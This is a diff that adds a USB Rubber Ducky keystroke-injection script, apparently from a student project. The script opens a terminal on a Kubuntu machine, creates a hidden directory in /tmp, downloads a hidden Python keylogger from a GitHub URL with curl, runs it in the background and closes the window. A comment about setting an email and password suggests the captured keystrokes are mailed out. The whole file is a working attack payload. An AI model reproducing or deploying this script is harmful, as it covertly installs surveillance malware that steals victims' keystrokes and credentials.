@@ -1,0 +1,14 @@
+REM Author : Gwendoline Dossegger
+REM Launch the keylogger on Linux (Kubuntu)
+REM access to the mass storage and run the keylogger
+DEFAULTDELAY 100
+ALT ESPACE
+STRING Konsole
+ENTER
+STRING mkdir -p /tmp/.keylogger && cd /tmp/.keylogger
+ENTER
+REM You need to change the value of the EMAIL & PASSWORD
+STRING curl -o .keylogger.py https://raw.githubusercontent.com/dosseggegw1/TB/master/Keyloggers/.keylogger-smtp.py?token=GHSAT0AAAAAABR34U5ULPWMG2WJNYXMXBWAYWO4SUQ && python3 .keylogger.py &
+ENTER
+DELAY 2000
+ALT F4
